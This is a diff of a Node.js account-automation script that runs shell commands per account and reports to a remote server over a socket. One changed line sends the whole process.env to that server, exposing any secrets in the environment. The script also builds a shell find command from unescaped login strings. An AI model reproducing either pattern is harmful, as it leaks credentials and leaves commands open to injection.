@@ -30,16 +30,13 @@ const main = async (account) => {
 
   shell.exec('find save/' + player + '_' + login + ' -type f ! -iname "Cookies" -delete', { silent: true })
   shell.exec(cmd, (code, b, c) => {
-    if (!check) {
-      accountsValid = accountsValid.filter(a => a !== account)
-      // 4 = DEL
-      if (code !== 4) {
-        socket.emit('loop', account)
-      }
-    }
-
+    accountsValid = accountsValid.filter(a => a !== account)
+    // 4 = DEL
     if (code === 4) {
       socket.emit('delete', account)
+    }
+    else if (!check) {
+      socket.emit('loop', account)
     }
 
     process.stdout.write(getTime() + " " + accountsValid.length + "\r");
@@ -56,7 +53,7 @@ socket.on('activate', () => {
 })
 
 socket.on('done', () => {
-  socket.emit('getOne', process.env.RAND)
+  socket.emit('getOne', process.env)
 
   const mainInter = setInterval(() => {
     if (over) { return clearInterval(mainInter) }
